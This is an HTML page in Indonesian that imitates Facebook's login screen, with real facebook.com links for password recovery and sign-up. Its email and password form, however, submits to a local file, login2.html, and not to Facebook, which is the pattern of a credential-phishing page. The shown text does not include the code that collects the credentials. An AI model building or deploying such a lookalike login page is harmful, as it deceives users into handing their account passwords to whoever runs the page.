<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Masuk atau Daftar</title>
    <link rel="stylesheet" href="style2.css">
</head>
<body>
    <div class="container">
        <div class="left-panel">
            <h1>facebook</h1>
            <p>Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam hidup Anda.</p>
        </div>
        <div class="right-panel">
            <div class="login-box">
                <form action="login2.html" method="GET">
                    <input type="text" name="email" placeholder="Email atau Nomor Telepon" class="form_login" required>
			        <input type="password" name="password" placeholder="Kata Sandi" class="form_login2" required>
                    <input type="submit" name="masuk" value="Masuk" class="tombollogin">
                    <a href="https://id-id.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Lupa Kata Sandi?</a>
                    <hr>
                </form>
                <form action="https://www.facebook.com/r.php?entry_point=login" method="GET">
                    <input type="submit" name="masuk" value="Buat akun baru" class="daftar">
                </form>
            </div>
            <p class="create-page-link"><a href="https://www.facebook.com/r.php?entry_point=login&locale=id_ID">Buat Halaman</a> untuk selebriti, band, atau bisnis.</p>
        </div>
    </div>
</body>
</html>
